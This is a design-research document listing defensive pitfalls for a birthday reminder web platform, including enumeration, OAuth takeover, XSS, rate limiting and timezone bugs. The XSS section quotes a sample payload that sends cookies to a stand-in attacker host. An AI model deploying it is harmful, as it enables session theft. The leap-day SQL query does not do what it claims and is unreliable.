# Domain Pitfalls

**Domain:** Social birthday reminder platform (Parabuains)
**Stack:** Next.js + separate Fastify/NestJS API + PostgreSQL
**Researched:** 2026-04-29
**Sources:** OWASP Cheat Sheet Series, web.dev Push API docs, domain expertise

---

## Critical Pitfalls

Mistakes that cause rewrites, security incidents, or total feature breakage.

---

### Pitfall C1: Birthday Notifications Fire in the Wrong Timezone

**What goes wrong:** The server schedules "send reminder 1 day before birthday" using UTC. A friend in São Paulo (UTC-3) whose birthday is April 1st receives the notification on April 1st evening (already their birthday) — or April 2nd. For a birthday reminder app, this is the core value proposition failing completely.

**Why it happens:** Developers store birthdays as `DATE` (no timezone) and schedule jobs at a fixed UTC time. They forget that "morning of April 1st" means different wall-clock moments across timezones.

**Consequences:** Notifications arrive late (after the birthday), early (wrong calendar day), or duplicated across DST transitions. Users abandon the app. Trust is destroyed — this is the primary product promise.

**Prevention:**
1. Store birthday as `DATE` (no time component — correct). Store user's **IANA timezone** (`America/Sao_Paulo`) at registration, not just UTC offset (offsets change with DST).
2. The notification scheduler must calculate `birthday_date AT TIME ZONE user_timezone` → convert to UTC → schedule.
3. For "notify 1 day before at 9am user's local time": compute `(birthday_this_year - 1 day) AT user_timezone 09:00` → convert to UTC for the cron job.
4. Use `pg` with `date-fns-tz` or `luxon` for timezone arithmetic. Never use raw `getTimezoneOffset()`.
5. Re-evaluate scheduled jobs when a user updates their timezone setting.

**Detection:** Write timezone-specific integration tests with users in UTC-12, UTC+5:30, and across DST boundaries (March/November). Test birthdays on February 29.

**Phase:** Core notifications phase (Phase 3 or earlier). Must be correct from day 1 — retrofitting timezone logic is expensive.

---

### Pitfall C2: Push Notification Permission Prompt on Page Load

**What goes wrong:** The app calls `Notification.requestPermission()` immediately when the user lands on the homepage or right after sign-up. The browser shows a hostile-looking popup with zero context. The user clicks "Block." Now the app **can never ask again** — the permission is permanently denied until the user manually digs into browser settings.

**Why it happens:** Developers think "more prompt = more subscriptions." The opposite is true.

**Consequences:** 50-80% of users immediately block notifications. Once blocked, there's no programmatic recovery path. The notification feature is dead for those users.

**Prevention:**
1. Never call `requestPermission()` without an explicit user trigger (a button click saying "Notify me of birthdays").
2. Implement the **double permission pattern**: show an in-app modal explaining the value first ("We'll remind you 1 day before your friends' birthdays"). Only call the browser prompt if they click "Yes, enable".
3. Place the permission opt-in in a settings page OR as a contextual prompt after the user adds their first friend.
4. Always provide a visible way to manage notification preferences — users who can't find an opt-out will block at the browser level.

**Detection:** If push opt-in rate < 20% or if user research shows people didn't understand why they were asked, this pitfall has been triggered.

**Phase:** Notifications phase. Must be designed into the UX from the start.

**Source:** https://web.dev/articles/push-notifications-permissions-ux

---

### Pitfall C3: Privacy Leak via Social Graph Enumeration

**What goes wrong:** Even with privacy controls ("only friends can see my profile"), an attacker can discover that user X and user Y are friends, or enumerate who is friends with whom, by:
- Querying `/api/users/123/friends` and getting a 200 vs 403 based on friendship status
- Using birthday notification data (e.g., "notify me when user 456's birthday is") to infer they are friends
- Checking if `/igor` returns a 200 or 404 for private profiles (leaking user existence)

**Why it happens:** Access control is applied to profile *content* but not to the *existence* of relationships or accounts.

**Consequences:** Stalkers can map social graphs. Private profiles can be discovered. Birthday data (date of birth) is PII that can be used for identity theft.

**Prevention:**
1. For private profiles: return HTTP 404 (not 403) to prevent confirming the account exists. Use the same response time regardless.
2. For friendship requests to private users: never confirm or deny — always respond "request sent" even if the profile doesn't exist.
3. Friendship queries must always scope to `WHERE user_id = current_user_id` — never allow querying other users' friend lists without their explicit privacy setting allowing it.
4. Birthday dates shown to non-friends should be limited to "month/day" only (never the year — year + name = identity theft risk).
5. Add row-level security in PostgreSQL as a defense-in-depth layer for sensitive queries.

**Detection:** Attempt to enumerate users via sequential IDs or usernames. Check if response times differ between existing/non-existing private profiles.

**Phase:** Auth + social features phase. Must be part of initial API design.

**Source:** OWASP IDOR Prevention (https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

---

### Pitfall C4: OAuth Account Takeover via Email Collision

**What goes wrong:** User registers with `alice@gmail.com` (email+password). Later they sign in with Google OAuth using the same email. If the app auto-links these accounts without verification, an attacker who controls the OAuth provider for a different account can take over the original account.

**Why it happens:** Apps naively do: `if (oauth_email == existing_email) → log in as that user`.

**Consequences:** Full account takeover. Attacker accesses birthday data, friend list, private messages.

**Prevention:**
1. Never auto-merge email+password accounts with OAuth accounts based on email alone.
2. On OAuth login: if email matches an existing account, require the user to first log in with their original method, then explicitly link the OAuth provider in settings.
3. Use separate "auth_providers" table with (user_id, provider, provider_user_id) — not a single email field.
4. Consider the pattern: OAuth email is confirmed → safe to suggest linking, but never auto-link.

**Detection:** Test: create account with email/password, then try Google OAuth login with same email. Does it give access without password?

**Phase:** Auth phase (Phase 1). Must be correct before launch.

**Source:** OWASP Authentication Cheat Sheet

---

### Pitfall C5: Stale Push Subscriptions Silently Fail

**What goes wrong:** A user subscribed to push notifications on their Chrome browser. 6 months later, they cleared browser data, reinstalled Chrome, or revoked the permission. The `PushSubscription` endpoint stored in the database is now invalid. The server keeps trying to send notifications to it, gets `410 Gone` or `404` responses from the push service, but ignores them and never cleans up.

**Why it happens:** Developers implement "send push" but don't implement "handle failed sends."

**Consequences:** Silent delivery failures. Birthday notifications never arrive. No visibility into notification health. Database fills with dead subscriptions.

**Prevention:**
1. Parse the HTTP response from the Web Push service after every send attempt.
2. On `410 Gone` or `404 Not Found`: immediately delete the subscription from the database.
3. On `429 Too Many Requests`: implement exponential backoff.
4. Track `last_successful_send` timestamp per subscription. Alert if a subscription has been failing for > 7 days.
5. When a user re-visits the app, check if their stored subscription is still valid (compare with current `navigator.serviceWorker.pushManager.getSubscription()`). Re-subscribe if stale.

**Detection:** Check notification delivery success rates. If > 5% fail silently, this pitfall is active.

**Phase:** Notifications phase. Must be built into the send pipeline from day 1.

**Source:** https://web.dev/articles/push-notifications-overview

---

## Moderate Pitfalls

Mistakes that degrade UX, cause subtle bugs, or create technical debt.

---

### Pitfall M1: Rate Limiting Applied Only at Login, Not at All Sensitive Endpoints

**What goes wrong:** Rate limiting is added to `/auth/login` but not to `/auth/forgot-password`, `/auth/resend-verification`, `/api/friendship/request`, or the wall message endpoints. Attackers use the unprotected endpoints for account enumeration (forgot-password tells them if an email exists) or spam (send 1000 friendship requests).

**Prevention:**
1. Apply rate limiting per IP AND per user (authenticated) to all state-changing endpoints.
2. For `/forgot-password`: always return "if that email exists, you'll get a link" regardless of whether the account exists. Rate-limit to 3 requests/hour per IP.
3. For friendship requests: rate-limit to 20/hour per authenticated user.
4. For wall messages: rate-limit to 10/hour per sender to prevent spam on birthday walls.
5. Use a sliding window rate limiter (not fixed window) to prevent the "reset at :00" burst attack.
6. Recommended: use `@fastify/rate-limit` with Redis backend for distributed rate limiting if deploying multiple API instances.

**Phase:** Auth + API layer (Phase 1). Apply globally, then tune per endpoint.

---

### Pitfall M2: XSS in Birthday Wall Messages

**What goes wrong:** The birthday wall lets users post messages like "Happy birthday! 🎂 <script>document.location='evil.com/steal?c='+document.cookie</script>". If the frontend renders raw HTML from the database, the attacker's script runs in the victim's browser.

**Why it happens:** Developers use `dangerouslySetInnerHTML` or `innerHTML` to render "rich" messages without sanitization.

**Consequences:** Session hijacking, credential theft, defacement of birthday walls.

**Prevention:**
1. Never use `dangerouslySetInnerHTML` with user content.
2. Store messages as plain text. If rich formatting is desired, store as Markdown and sanitize on render using `DOMPurify` (client) or a server-side sanitizer.
3. Apply Content Security Policy headers that block inline scripts.
4. Sanitize at write time AND at render time (defense in depth).

**Phase:** Social features phase (wall messages). Any user-generated content display.

---

### Pitfall M3: Bilateral Friendship Race Condition

**What goes wrong:** Alice sends Bob a friend request. Bob, at the same moment, sends Alice a friend request. Both see "request pending." The backend now has two friendship rows with opposite directions but no mutual confirmation. Depending on implementation, both may end up as "pending" forever, both may auto-accept, or the friendship count may be wrong.

**Prevention:**
1. Use a single canonical friendship record: always store `user_id_1 < user_id_2` (lexicographic ordering) to ensure uniqueness.
2. Use a PostgreSQL `UNIQUE` constraint on `(MIN(user_a, user_b), MAX(user_a, user_b))` — or use a generated column.
3. When inserting a friendship request, use `INSERT ... ON CONFLICT DO UPDATE` (upsert) to handle the race atomically.
4. Use database transactions for friendship state changes to prevent partial updates.

**Phase:** Social features phase (friendship system).

---

### Pitfall M4: Email Bounce/Spam Not Handled, Domain Blacklisted

**What goes wrong:** Birthday reminder emails are sent via an email provider (Resend, SendGrid, etc.). Some recipients' addresses are invalid or have full inboxes. The emails bounce. The app keeps retrying. The sending domain gets flagged as spam. All future emails land in spam folders — including for valid users.

**Prevention:**
1. Subscribe to bounce/complaint webhooks from the email provider.
2. On hard bounce: immediately mark email as invalid, stop sending, flag for the user to update.
3. On spam complaint: immediately unsubscribe the user from all emails.
4. Keep sending volume warm: don't suddenly send 10,000 emails from a new domain. Start with small batches and ramp up.
5. Implement proper SPF, DKIM, and DMARC DNS records for the sending domain from day 1.
6. Monitor sender reputation via Google Postmaster Tools.

**Phase:** Notifications phase. Email infrastructure setup must happen before first send.

---

### Pitfall M5: Sequential Integer IDs Expose User Count and Enable Enumeration

**What goes wrong:** The public profile URL is `parabuains.com/igor` (username-based — safe). But API endpoints use sequential IDs: `GET /api/users/123`. An attacker iterates 1 to N and scrapes all user profiles, birthdays, and friend lists that have "public" visibility.

**Prevention:**
1. Use UUIDs (v4) as primary keys for all user-facing API resources, OR use a short random token as the public identifier.
2. Never expose sequential integer IDs in any API response that could be iterated.
3. For admin-only internal IDs, keep them integer for performance, but map to UUID at the API boundary.
4. Apply rate limiting on public profile endpoints specifically (e.g., 60 requests/minute per IP for unauthenticated reads).

**Phase:** API design phase (Phase 1). Must be in the schema from day 1 — migration is painful.

**Source:** OWASP IDOR Prevention

---

### Pitfall M6: 2FA Recovery Code Handling

**What goes wrong:** The app implements TOTP-based 2FA but doesn't implement recovery codes properly. Users who lose their authenticator device are permanently locked out. Or worse: recovery codes are emailed without encryption and an email breach bypasses 2FA entirely.

**Prevention:**
1. Generate 10 one-time recovery codes at 2FA enrollment. Show them once, store hashed (bcrypt).
2. Invalidate a recovery code after single use.
3. When a recovery code is used: invalidate all other recovery codes and prompt re-enrollment.
4. Require password re-verification before showing "disable 2FA" option.
5. Offer account recovery via email + identity verification (not just an email link) if all 2FA methods are lost.

**Phase:** Auth/Security phase (Phase 1 or dedicated security hardening phase).

**Source:** OWASP Multifactor Authentication Cheat Sheet

---

### Pitfall M7: Notification Scheduling Fan-Out Storm

**What goes wrong:** The notification scheduler runs a daily cron job: "find all birthdays tomorrow → for each user → send notifications to all their friends." If user Alice has 500 friends, and 100 users have birthdays tomorrow, the cron job tries to send 50,000 notifications at once. The email provider rate-limits the app. The push service throttles requests. The database is hammered with queries.

**Prevention:**
1. Use a job queue (BullMQ + Redis) to process notifications asynchronously with concurrency limits.
2. Batch email sends: most providers support bulk send APIs (e.g., Resend's `batch.send`).
3. Stagger notification sends across the morning (e.g., spread over 2 hours using job delays).
4. Add a DB index on `birthday_month + birthday_day` for efficient "find tomorrow's birthdays" queries.
5. Pre-compute "upcoming birthdays" for each user and cache it; don't compute on every cron run.

**Phase:** Notifications phase. Must be designed before implementing the scheduler.

---

## Minor Pitfalls

Smaller issues that cause friction or create technical debt.

---

### Pitfall Mi1: February 29 Birthday Edge Case

**What goes wrong:** Users born on February 29 (leap day) have their birthday silently skipped in non-leap years because `WHERE birthday_month = 2 AND birthday_day = 29` returns no rows on 2025-02-28.

**Prevention:**
- For non-leap years, treat Feb 29 birthdays as occurring on Feb 28.
- Handle this in the notification scheduler query: `WHERE (birthday_month = 2 AND birthday_day = 28 AND EXTRACT(YEAR FROM CURRENT_DATE) % 4 != 0) OR (birthday_month = 2 AND birthday_day = 29)`
- Test explicitly with leap day test users.

**Phase:** Notifications phase.

---

### Pitfall Mi2: Anonymous Messages Cannot Be Moderated

**What goes wrong:** The app supports anonymous messages on the birthday wall. Users abuse this to post harassment or hate speech. The victim can't block "anonymous" and doesn't know who to report. The platform has no moderation tools.

**Prevention:**
1. Anonymous messages should be anonymous to the *recipient* only, not to the platform. Store the sender's user ID internally.
2. Implement a "report message" button that sends the actual sender info to admins.
3. Rate-limit anonymous messages more aggressively (1-2/day per sender per recipient).
4. Consider requiring account age > 7 days to send anonymous messages.
5. Build basic moderation tools (message takedown, user warnings) before launching the feature.

**Phase:** Social features phase (anonymous messages).

---

### Pitfall Mi3: Username Squatting and Impersonation

**What goes wrong:** Users register usernames like `google`, `admin`, `support`, `parabuains`, `instagram`, or variations of famous names to squat or phish. A user registers `john-smith` and sends "birthday" messages to John Smith's actual friends, who assume it's really him.

**Prevention:**
1. Maintain a blocklist of reserved usernames (`admin`, `api`, `support`, `www`, `mail`, known brands).
2. Normalize usernames for uniqueness check: `johnsmith` = `john-smith` = `john_smith` (prevent homoglyph attacks).
3. Add a "report this profile" feature.
4. Consider verified badges for notable users in v2.

**Phase:** Auth/Profile phase (Phase 1).

---

### Pitfall Mi4: JWT Secret Rotation Disrupts All Sessions

**What goes wrong:** The app uses stateless JWTs for auth. A security issue is discovered and the JWT secret needs to be rotated. Rotating the secret immediately invalidates **all users' sessions simultaneously** — everyone is logged out. If the separate API backend and Next.js BFF use different JWT configurations, tokens from one may be rejected by the other.

**Prevention:**
1. Support multiple valid JWT secrets simultaneously during rotation (grace period of 15-30 minutes).
2. Keep JWT expiry short (15-60 minutes) with refresh tokens to limit the blast radius of a compromised token.
3. Store refresh tokens in the database (allows instant revocation without rotating secrets).
4. Ensure Next.js BFF and Fastify/NestJS API use the same JWT configuration (same issuer, same public key for RS256).
5. Prefer RS256 (asymmetric) over HS256 (shared secret) — the API backend only needs the public key, not the secret.

**Phase:** Auth phase (Phase 1).

---

### Pitfall Mi5: Push Subscription Not Refreshed After Service Worker Update

**What goes wrong:** The service worker is updated. In some browsers, the `PushSubscription` linked to the old service worker registration becomes invalid or mislinked. New push messages are sent to the old endpoint, which may silently fail.

**Prevention:**
1. On service worker `activate` event, check if the current `pushManager.getSubscription()` matches the subscription stored on the server.
2. If mismatch or subscription is null: re-subscribe and update the server.
3. Implement the service worker update lifecycle carefully (call `skipWaiting()` + `clients.claim()` strategically to avoid breaking active sessions).

**Phase:** Notifications phase (service worker implementation).

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|----------------|-----------|
| Auth setup (Phase 1) | OAuth account takeover via email collision (C4) | Separate auth_providers table, never auto-merge |
| Auth setup (Phase 1) | Sequential IDs enabling enumeration (M5) | UUID primary keys from day 1 |
| Auth setup (Phase 1) | Weak error messages leaking user existence | Generic "invalid email or password" for all auth errors |
| Auth setup (Phase 1) | JWT secret rotation disruption (Mi4) | RS256 + refresh tokens with DB storage |
| Social features | Privacy leak via graph enumeration (C3) | 404 for private profiles, scope all queries to current user |
| Social features | XSS in wall messages (M2) | DOMPurify + CSP headers |
| Social features | Friendship race condition (M3) | Canonical ordering + unique constraint + upsert |
| Social features | Anonymous message abuse (Mi2) | Anonymous to recipient only; store sender internally |
| Social features | Username squatting (Mi3) | Reserved username blocklist from day 1 |
| Notifications | Birthday timezone bugs (C1) | Store user IANA timezone; compute in user's timezone |
| Notifications | February 29 leap year (Mi1) | Treat as Feb 28 in non-leap years |
| Notifications | Push permission UX disaster (C2) | Double permission pattern; contextual prompt only |
| Notifications | Stale push subscriptions (C5) | Handle 410/404 from push service; delete stale subscriptions |
| Notifications | Notification fan-out storm (M7) | BullMQ + batching + staggered sends |
| Notifications | Email bounce handling (M4) | Webhook listener for bounces/complaints; SPF+DKIM+DMARC |
| Notifications | Push subscription lost after SW update (Mi5) | Revalidate subscription on SW activate |
| Security hardening | Rate limiting gaps (M1) | Rate-limit ALL state-changing endpoints, not just login |
| Security hardening | 2FA recovery code mishandling (M6) | Hashed single-use codes; proper lockout recovery |

---

## Sources

- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP IDOR Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
- OWASP User Privacy Protection: https://cheatsheetseries.owasp.org/cheatsheets/User_Privacy_Protection_Cheat_Sheet.html
- OWASP Multifactor Authentication: https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
- Web Push Notification Overview (web.dev): https://web.dev/articles/push-notifications-overview
- Push Permission UX (web.dev): https://web.dev/articles/push-notifications-permissions-ux
- Push FAQ (web.dev): https://web.dev/articles/push-notifications-faq
- Next.js Security Docs (Context7): https://github.com/vercel/next.js/blob/canary/docs/01-app/02-guides/data-security.mdx
